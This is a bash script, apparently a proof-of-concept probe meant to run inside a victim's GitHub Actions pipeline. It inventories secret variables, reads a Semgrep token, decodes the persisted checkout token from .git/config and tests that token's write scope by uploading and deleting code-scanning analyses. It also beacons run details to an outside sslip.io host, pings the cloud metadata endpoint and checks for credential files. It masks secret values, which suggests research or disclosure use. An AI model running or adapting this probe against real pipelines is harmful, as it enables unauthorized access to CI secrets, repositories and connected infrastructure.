#!/usr/bin/env bash
# ci-cred-lab masked credential probe.
# Outputs presence flags, lengths and sha256[:12] prefixes only.
# This script never prints a secret value (no set -x, no echo of $v).
set -uo pipefail

O="out"
mkdir -p "$O"
OWNERREPO="${GITHUB_REPOSITORY}"
TOK="${CTX_GITHUB_TOKEN:-}"
hp() { printf '%s' "$1" | sha256sum | cut -c1-12; }

# ---- 1. credential inventory (default job env + runner-provided token-like vars) ----
{
  echo "kind|name|present|len|sha256_prefix"
  for n in SEMGREP_APP_URL SEMGREP_APP_TOKEN SDLC_SLACK_NOTIFICATIONS GITHUB_TOKEN CTX_GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_ID_TOKEN_REQUEST_TOKEN ACTIONS_ID_TOKEN_REQUEST_URL ACTIONS_CACHE_URL ACTIONS_RESULTS_URL; do
    if [ -n "${!n+x}" ]; then
      v="${!n}"
      echo "env|$n|yes|${#v}|$(hp "$v")"
    else
      echo "env|$n|no|0|-"
    fi
  done
} > "$O/credentials_inventory.txt"

# ---- 2. read-access proof: env secret -> scratch file -> hash -> delete ----
SCRATCH="$(mktemp -d)"
{
  v="${SEMGREP_APP_TOKEN:-}"
  echo "SEMGREP_APP_TOKEN: present=$([ -n "$v" ] && echo yes || echo no) len=${#v} env_sha256_prefix=$(hp "$v")"
  if [ -n "$v" ]; then
    printf '%s' "$v" > "$SCRATCH/tok"
    echo "scratch_file_write=ok bytes=$(wc -c < "$SCRATCH/tok" | tr -d ' ')"
    echo "scratch_file_sha256_prefix=$(sha256sum "$SCRATCH/tok" | cut -c1-12)"
    rm -f "$SCRATCH/tok"
    if [ -e "$SCRATCH/tok" ]; then echo "scratch_file_delete=FAILED"; else echo "scratch_file_delete=ok"; fi
  else
    echo "scratch_file_write=skipped (no value)"
  fi
} > "$O/secret_read_proof.txt"
rm -rf "$SCRATCH"

# ---- 3. persisted checkout credential (.git/config extraheader) vs context token ----
{
  extra="$(git config --get 'http.https://github.com/.extraheader' 2>/dev/null || true)"
  if [ -n "$extra" ]; then
    b64="${extra##* }"
    dec="$(printf '%s' "$b64" | base64 -d 2>/dev/null || true)"
    echo "persisted_extraheader=present value_len=${#extra} b64_len=${#b64} decoded_len=${#dec}"
    echo "decoded_has_x_access_token=$(printf '%s' "$dec" | grep -q 'x-access-token' && echo yes || echo no)"
    ptok="$(printf '%s' "$dec" | grep -oE 'ghs_[A-Za-z0-9_]+' | head -1 || true)"
    echo "extracted_token_len=${#ptok} extracted_token_sha256_prefix=$(hp "$ptok")"
    echo "context_token_len=${#TOK} context_token_sha256_prefix=$(hp "$TOK")"
    if [ -n "$ptok" ] && [ "$(hp "$ptok")" = "$(hp "$TOK")" ]; then
      echo "persisted_token_equals_context_token=YES"
    else
      echo "persisted_token_equals_context_token=NO"
    fi
    echo "source_path=${GITHUB_WORKSPACE}/.git/config"
  else
    echo "persisted_extraheader=absent"
  fi
  echo "--- git config section names (no values) ---"
  git config --local --name-only --list | sort -u | sed 's/[A-Za-z0-9+/=]\{32,\}/<redacted-str>/g' | head -20
} > "$O/persisted_credential_proof.txt"

# ---- 4. GITHUB_TOKEN scope checks (masked; token only in Authorization header) ----
{
  echo "event=${GITHUB_EVENT_NAME} ref=${GITHUB_REF} sha=${GITHUB_SHA}"
  echo "token_source=context-mapped github.token; default step env GITHUB_TOKEN absent (see credentials_inventory)"
  code="$(curl -sS -m 20 -o "$O/repo_view.json" -w '%{http_code}' \
    -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" \
    "https://api.github.com/repos/$OWNERREPO" || echo curl-err)"
  echo "GET /repos/$OWNERREPO -> $code"
  jq -c '{permissions:(.permissions//null),private:.private,visibility:.visibility}' "$O/repo_view.json" 2>/dev/null || true

  code="$(curl -sS -m 20 -o /dev/null -w '%{http_code}' \
    -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" \
    "https://api.github.com/user" || echo curl-err)"
  echo "GET /user -> $code (403 expected for installation tokens)"

  pout="$(git push --dry-run origin "HEAD:refs/heads/cred-lab-dryrun" 2>&1)"
  prc=$?
  echo "git_push_dry_run_rc=$prc"
  printf '%s\n' "$pout" | tail -4 | sed 's/[A-Za-z0-9_]\{24,\}/<redacted-str>/g'

  SARIF_JSON='{"version":"2.1.0","$schema":"https://json.schemastore.org/sarif-2.1.0.json","runs":[{"tool":{"driver":{"name":"ci-cred-lab-canary","rules":[]}},"results":[]}]}'
  SARIF_B64="$(printf '%s' "$SARIF_JSON" | gzip -c | base64 -w0)"
  body="$(jq -n --arg sha "$GITHUB_SHA" --arg ref "$GITHUB_REF" --arg s "$SARIF_B64" \
    '{commit_sha:$sha,ref:$ref,sarif:$s,tool_name:"ci-cred-lab-canary"}')"
  code="$(curl -sS -m 30 -o "$O/sarif_post.json" -w '%{http_code}' -X POST \
    -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" \
    -H "Content-Type: application/json" \
    "https://api.github.com/repos/$OWNERREPO/code-scanning/sarifs" -d "$body" || echo curl-err)"
  echo "POST /code-scanning/sarifs -> $code"
  sarif_id="$(jq -r '.id // empty' "$O/sarif_post.json" 2>/dev/null || true)"
  echo "sarif_upload_id_present=$([ -n "$sarif_id" ] && echo yes || echo no)"
  if [ -n "$sarif_id" ]; then
    sleep 6
    ids="$(curl -sS -m 20 -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" \
      "https://api.github.com/repos/$OWNERREPO/code-scanning/analyses?tool_name=ci-cred-lab-canary" \
      | jq -r '.[].id' 2>/dev/null | head -3 || true)"
    for id in $ids; do
      dc="$(curl -sS -m 20 -o /dev/null -w '%{http_code}' -X DELETE \
        -H "Authorization: Bearer $TOK" -H "Accept: application/vnd.github+json" \
        "https://api.github.com/repos/$OWNERREPO/code-scanning/analyses/$id" || echo curl-err)"
      echo "DELETE analysis $id -> $dc"
    done
  fi
} > "$O/github_token_scope.txt"

# ---- 5. egress canary + downstream reachability (read-only) ----
{
  CANARY="SDLC-CANARY-$(date -u +%s)-${RANDOM}"
  code="$(curl -sS -m 20 -o "$O/egress_response.txt" -w '%{http_code}' \
    "http://159-195-55-35.sslip.io:443/sdlc-canary?canary=$CANARY&event=$GITHUB_EVENT_NAME&run=$GITHUB_RUN_ID" || echo curl-err)"
  echo "egress_canary_http=$code canary=$CANARY"
  echo "--- reachability (HEAD, no auth) ---"
  for u in https://registry.npmjs.org/ https://pypi.org/simple/ https://ghcr.io/ https://registry-1.docker.io/v2/ https://semgrep.dev/ https://api.github.com/; do
    c="$(curl -sS -m 12 -o /dev/null -w '%{http_code}' -I "$u" 2>/dev/null || echo curl-err)"
    echo "HEAD $u -> $c"
  done
  mc="$(curl -sS -m 4 -o /dev/null -w '%{http_code}' http://169.254.169.254/ 2>/dev/null || echo unreachable)"
  echo "GET http://169.254.169.254/ -> $mc (metadata endpoint; no metadata query made)"
  echo "--- credential-file presence ---"
  for f in "$HOME/.docker/config.json" "$HOME/.npmrc" "$HOME/.git-credentials" "$HOME/.netrc" "$HOME/.config/pip/pip.conf" "$HOME/.aws/credentials" "$HOME/.config/gcloud/application_default_credentials.json" "$HOME/.kube/config" "$HOME/.gitconfig"; do
    if [ -e "$f" ]; then echo "file|$f|present"; else echo "file|$f|absent"; fi
  done
  if [ -f "$HOME/.docker/config.json" ]; then
    echo "docker_config_registry_keys=$(jq -r '.auths // {} | keys | join(",")' "$HOME/.docker/config.json" 2>/dev/null || echo parse-fail)"
    echo "docker_config_auth_secret_entries=$(jq -r '[.auths // {} | .[] | select(.auth? != null)] | length' "$HOME/.docker/config.json" 2>/dev/null || echo 0)"
  fi
  echo "--- cloud credential env presence ---"
  for n in AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN GOOGLE_APPLICATION_CREDENTIALS AZURE_CLIENT_ID AZURE_CLIENT_SECRET ARM_CLIENT_ID ARM_CLIENT_SECRET; do
    if [ -n "${!n+x}" ]; then echo "cloudenv|$n|present"; else echo "cloudenv|$n|absent"; fi
  done
} > "$O/egress_and_reach.txt"

# ---- 6. env variable names (names only) + run context ----
env | cut -d= -f1 | sort -u > "$O/env_names.txt"
env | cut -d= -f1 | grep -Ei 'token|secret|key|pass|cred' | sort -u > "$O/sensitive_env_names.txt"
{
  echo "runner_os=${RUNNER_OS:-} runner_arch=${RUNNER_ARCH:-} whoami=$(whoami) uid=$(id -u)"
  echo "github_event_name=$GITHUB_EVENT_NAME github_actor=$GITHUB_ACTOR"
  echo "hostname=$(hostname)"
  echo "kernel=$(uname -s -r -m)"
} > "$O/context.txt"

echo "probe complete"
